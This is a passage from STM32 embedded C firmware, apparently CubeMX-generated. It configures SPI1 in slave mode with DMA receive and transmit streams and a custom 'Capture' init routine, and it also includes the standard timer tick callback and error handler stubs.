	    hdma_spi1_rx.Init.Direction = DMA_PERIPH_TO_MEMORY;
	    hdma_spi1_rx.Init.PeriphInc = DMA_PINC_DISABLE;
	    hdma_spi1_rx.Init.MemInc = DMA_MINC_ENABLE;
	    hdma_spi1_rx.Init.PeriphDataAlignment = DMA_PDATAALIGN_BYTE;
	    hdma_spi1_rx.Init.MemDataAlignment = DMA_MDATAALIGN_BYTE;
	    hdma_spi1_rx.Init.Mode = DMA_NORMAL;
	    hdma_spi1_rx.Init.Priority = DMA_PRIORITY_LOW;
	    hdma_spi1_rx.Init.FIFOMode = DMA_FIFOMODE_DISABLE;
	    if (HAL_DMA_Init(&hdma_spi1_rx) != HAL_OK)
	    {
	      Error_Handler();
	    }

	    __HAL_LINKDMA(hspi,hdmarx,hdma_spi1_rx);

	    /* SPI1_TX Init */
	    hdma_spi1_tx.Instance = DMA2_Stream2;
	    hdma_spi1_tx.Init.Channel = DMA_CHANNEL_2;
	    hdma_spi1_tx.Init.Direction = DMA_MEMORY_TO_PERIPH;
	    hdma_spi1_tx.Init.PeriphInc = DMA_PINC_DISABLE;
	    hdma_spi1_tx.Init.MemInc = DMA_MINC_ENABLE;
	    hdma_spi1_tx.Init.PeriphDataAlignment = DMA_PDATAALIGN_BYTE;
	    hdma_spi1_tx.Init.MemDataAlignment = DMA_MDATAALIGN_BYTE;
	    hdma_spi1_tx.Init.Mode = DMA_NORMAL;
	    hdma_spi1_tx.Init.Priority = DMA_PRIORITY_LOW;
	    hdma_spi1_tx.Init.FIFOMode = DMA_FIFOMODE_DISABLE;
	    if (HAL_DMA_Init(&hdma_spi1_tx) != HAL_OK)
	    {
	      Error_Handler();
	    }

	    __HAL_LINKDMA(hspi,hdmatx,hdma_spi1_tx);

	    /* SPI1 interrupt Init */
	    HAL_NVIC_SetPriority(SPI1_IRQn, 0, 0);
	    HAL_NVIC_EnableIRQ(SPI1_IRQn);
	  /* USER CODE BEGIN SPI1_MspInit 1 */

	  /* USER CODE END SPI1_MspInit 1 */
	  }

}

HAL_StatusTypeDef HAL_SPI_Init_Capture(SPI_HandleTypeDef *hspi)
{
	  /* Check the SPI handle allocation */
	  if (hspi == NULL)
	  {
	    return HAL_ERROR;
	  }

	  /* Check the parameters */
	  assert_param(IS_SPI_ALL_INSTANCE(hspi->Instance));
	  assert_param(IS_SPI_MODE(hspi->Init.Mode));
	  assert_param(IS_SPI_DIRECTION(hspi->Init.Direction));
	  assert_param(IS_SPI_DATASIZE(hspi->Init.DataSize));
	  assert_param(IS_SPI_NSS(hspi->Init.NSS));
	  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
	  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
	  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
	  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
	  {
	    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
	    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));
	  }
	#if (USE_SPI_CRC != 0U)
	  assert_param(IS_SPI_CRC_CALCULATION(hspi->Init.CRCCalculation));
	  if (hspi->Init.CRCCalculation == SPI_CRCCALCULATION_ENABLE)
	  {
	    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
	  }
	#else
	  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
	#endif /* USE_SPI_CRC */

	  if (hspi->State == HAL_SPI_STATE_RESET)
	  {
	    /* Allocate lock resource and initialize it */
	    hspi->Lock = HAL_UNLOCKED;

	#if (USE_HAL_SPI_REGISTER_CALLBACKS == 1U)
	    /* Init the SPI Callback settings */
	    hspi->TxCpltCallback       = HAL_SPI_TxCpltCallback;       /* Legacy weak TxCpltCallback       */
	    hspi->RxCpltCallback       = HAL_SPI_RxCpltCallback;       /* Legacy weak RxCpltCallback       */
	    hspi->TxRxCpltCallback     = HAL_SPI_TxRxCpltCallback;     /* Legacy weak TxRxCpltCallback     */
	    hspi->TxHalfCpltCallback   = HAL_SPI_TxHalfCpltCallback;   /* Legacy weak TxHalfCpltCallback   */
	    hspi->RxHalfCpltCallback   = HAL_SPI_RxHalfCpltCallback;   /* Legacy weak RxHalfCpltCallback   */
	    hspi->TxRxHalfCpltCallback = HAL_SPI_TxRxHalfCpltCallback; /* Legacy weak TxRxHalfCpltCallback */
	    hspi->ErrorCallback        = HAL_SPI_ErrorCallback;        /* Legacy weak ErrorCallback        */
	    hspi->AbortCpltCallback    = HAL_SPI_AbortCpltCallback;    /* Legacy weak AbortCpltCallback    */

	    if (hspi->MspInitCallback == NULL)
	    {
	      hspi->MspInitCallback = HAL_SPI_MspInit_Capture; /* Legacy weak MspInit  */
	    }

	    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
	    hspi->MspInitCallback(hspi);
	#else
	    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
	    HAL_SPI_MspInit_Capture(hspi);
	#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
	  }

	  hspi->State = HAL_SPI_STATE_BUSY;

	  /* Disable the selected SPI peripheral */
	  __HAL_SPI_DISABLE(hspi);

	  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
	  /* Configure : SPI Mode, Communication Mode, Data size, Clock polarity and phase, NSS management,
	  Communication speed, First bit and CRC calculation state */
	  WRITE_REG(hspi->Instance->CR1, (hspi->Init.Mode | hspi->Init.Direction | hspi->Init.DataSize |
	                                  hspi->Init.CLKPolarity | hspi->Init.CLKPhase | (hspi->Init.NSS & SPI_CR1_SSM) |
	                                  hspi->Init.BaudRatePrescaler | hspi->Init.FirstBit  | hspi->Init.CRCCalculation));

	  /* Configure : NSS management, TI Mode */
	  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) | hspi->Init.TIMode));

	#if (USE_SPI_CRC != 0U)
	  /*---------------------------- SPIx CRCPOLY Configuration ------------------*/
	  /* Configure : CRC Polynomial */
	  if (hspi->Init.CRCCalculation == SPI_CRCCALCULATION_ENABLE)
	  {
	    WRITE_REG(hspi->Instance->CRCPR, hspi->Init.CRCPolynomial);
	  }
	#endif /* USE_SPI_CRC */

	#if defined(SPI_I2SCFGR_I2SMOD)
	  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
	  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
	#endif /* SPI_I2SCFGR_I2SMOD */

	  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
	  hspi->State     = HAL_SPI_STATE_READY;

	  return HAL_OK;
}

void MX_SPI1_Init_Capture(void)
{

	  /* USER CODE BEGIN SPI1_Init 0 */

	  /* USER CODE END SPI1_Init 0 */

	  /* USER CODE BEGIN SPI1_Init 1 */

	  /* USER CODE END SPI1_Init 1 */
	  /* SPI1 parameter configuration*/
	  hspi1.Instance = SPI1;
	  hspi1.Init.Mode = SPI_MODE_SLAVE;
	  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
	  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
	  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
	  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
	  hspi1.Init.NSS = SPI_NSS_HARD_INPUT;
	  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
	  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
	  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
	  hspi1.Init.CRCPolynomial = 10;
	  if (HAL_SPI_Init_Capture(&hspi1) != HAL_OK)
	  {
	    Error_Handler();
	  }
	  /* USER CODE BEGIN SPI1_Init 2 */

	  /* USER CODE END SPI1_Init 2 */

}
/* USER CODE END 4 */

/**
  * @brief  Period elapsed callback in non blocking mode
  * @note   This function is called  when TIM1 interrupt took place, inside
  * HAL_TIM_IRQHandler(). It makes a direct call to HAL_IncTick() to increment
  * a global variable "uwTick" used as application time base.
  * @param  htim : TIM handle
  * @retval None
  */
void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim)
{
  /* USER CODE BEGIN Callback 0 */

  /* USER CODE END Callback 0 */
  if (htim->Instance == TIM1) {
    HAL_IncTick();
  }
  /* USER CODE BEGIN Callback 1 */

  /* USER CODE END Callback 1 */
}

/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
  {
  }
  /* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
  * @brief  Reports the name of the source file and the source line number
  *         where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(uint8_t *file, uint32_t line)
{
  /* USER CODE BEGIN 6 */
  /* User can add his own implementation to report the file name and line number,
     ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */



  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */

/************************ (C) COPYRIGHT STMicroelectronics *****END OF FILE****/
